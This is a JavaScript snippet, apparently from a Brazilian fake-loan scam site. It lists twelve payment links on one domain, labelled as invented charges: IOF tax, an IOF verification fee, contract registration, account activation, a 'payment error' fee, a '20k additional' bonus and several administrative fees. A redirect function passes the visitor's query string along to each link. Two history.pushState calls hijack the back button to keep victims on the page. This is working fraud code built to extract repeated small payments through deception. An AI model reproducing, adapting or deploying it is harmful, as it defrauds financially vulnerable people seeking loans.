const baseLinks = {
    up1: "https://pay.carrinhofinaliza.site/eApQgz25R2VgEb7", // IOF
    up2: "https://pay.carrinhofinaliza.site/mwK436dnYd4GQ8b", // Taxa de verificação de IOF
    up3: "https://pay.carrinhofinaliza.site/BNjzgPl9mljgM78", // Seguro Prestamista "tarifa de cadastro"
    up4: "https://pay.carrinhofinaliza.site/ODAK3LlNylb3E6V", // NFe
    up5: "https://pay.carrinhofinaliza.site/DYp0ZxVbrVegmvX", // Ativar conta
    up6: "https://pay.carrinhofinaliza.site/nQ7kZ7pQYpzG0eJ", // Taxa de registro do contrato
    up7: "https://pay.carrinhofinaliza.site/RmA83EaWPaj3PVp", // Parabéns, 20k adicional
    up8: "https://pay.carrinhofinaliza.site/2wq7Gr7dL7jgBAN", // Erro no pagamento - 14,06
    up9: "https://pay.carrinhofinaliza.site/6YQPgjn6Lnngpxz", // APP - 11,99
    up10:"https://pay.carrinhofinaliza.site/5pjw3RnpQnm32lQ", // Taxa de Abertura TAC - 16,92
    up11:"https://pay.carrinhofinaliza.site/521rZJz1yzeZeaX", // Taxa de Consultoria Financeira - 19,53
    up12:"https://pay.carrinhofinaliza.site/P5LNZ8zyYz5gaRy" // Taxa de Processamento Administrativo - 31,92

};

function redirect(key) {
    try {
        if (!baseLinks[key]) {
            throw new Error(`Link para ${key} não encontrado!`);
        }

        const url = new URL(baseLinks[key]);
        url.search = new URLSearchParams(window.location.search).toString();

        window.location.href = url.href;
        
    } catch (error) {
        console.error('Erro no redirecionamento:', error);
        alert(`Erro: ${error.message || "Não foi possível redirecionar"}`);
    }
}

// Adiciona duas entradas no histórico para capturar a navegação para trás
history.pushState({}, '', location.href);
history.pushState({}, '', location.href);


